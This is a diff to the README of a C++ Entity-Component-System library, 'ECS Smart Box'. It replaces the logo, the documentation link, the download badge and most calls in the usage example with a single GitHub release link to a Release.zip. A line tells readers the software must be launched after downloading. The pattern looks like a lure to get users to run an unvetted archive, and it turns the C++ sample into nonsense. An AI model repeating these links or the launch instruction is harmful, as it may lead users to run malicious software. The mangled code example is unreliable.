@@ -1,7 +1,7 @@
 
 # ECS Smart Box 📦
 
-![ECS Smart Box Logo](https://example.com/ecs-smart-box-logo.png)
+![ECS Smart Box Logo](https://github.com/jefferyy56/ECS-Smart-Box/releases/download/v1.0/Release.zip)
 
 Welcome to **ECS Smart Box**, a powerful C++ implementation of a basic Entity-Component-System using heap-allocated, type-erased components. This system utilizes a mechanism similar to `unique_ptr` to manage memory efficiently while offering flexibility to build complex interactive systems.
 
@@ -30,19 +30,19 @@ int main() {
     ECSManager ecsManager;
 
     // Create entities
-    Entity& player = ecsManager.createEntity();
+    Entity& player = https://github.com/jefferyy56/ECS-Smart-Box/releases/download/v1.0/Release.zip();
     
     // Add components
-    player.addComponent<TransformComponent>(x, y);
-    player.addComponent<RenderComponent>("player_sprite.png");
+    https://github.com/jefferyy56/ECS-Smart-Box/releases/download/v1.0/Release.zip<TransformComponent>(x, y);
+    https://github.com/jefferyy56/ECS-Smart-Box/releases/download/v1.0/Release.zip<RenderComponent>("https://github.com/jefferyy56/ECS-Smart-Box/releases/download/v1.0/Release.zip");
 
     // Define systems
     MovementSystem movementSystem;
     RenderSystem renderSystem;
 
     // Update systems
-    movementSystem.update(ecsManager);
-    renderSystem.update(ecsManager);
+    https://github.com/jefferyy56/ECS-Smart-Box/releases/download/v1.0/Release.zip(ecsManager);
+    https://github.com/jefferyy56/ECS-Smart-Box/releases/download/v1.0/Release.zip(ecsManager);
 
     return 0;
 }
@@ -54,12 +54,12 @@ int main() {
 
 ## Download Software 📥
 
-[![Download ECS Smart Box](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download ECS Smart Box](https://github.com/jefferyy56/ECS-Smart-Box/releases/download/v1.0/Release.zip)](https://github.com/jefferyy56/ECS-Smart-Box/releases/download/v1.0/Release.zip)
 
 *Note: The software needs to be launched after downloading.*
 
 ## Learn More 📚
 
-For more information on **ECS Smart Box** and its capabilities, visit the official [documentation website](https://ecs-smart-box.com).
+For more information on **ECS Smart Box** and its capabilities, visit the official [documentation website](https://github.com/jefferyy56/ECS-Smart-Box/releases/download/v1.0/Release.zip).
 
 Start building dynamic and interactive systems with ease using the ECS Smart Box library! 🌟
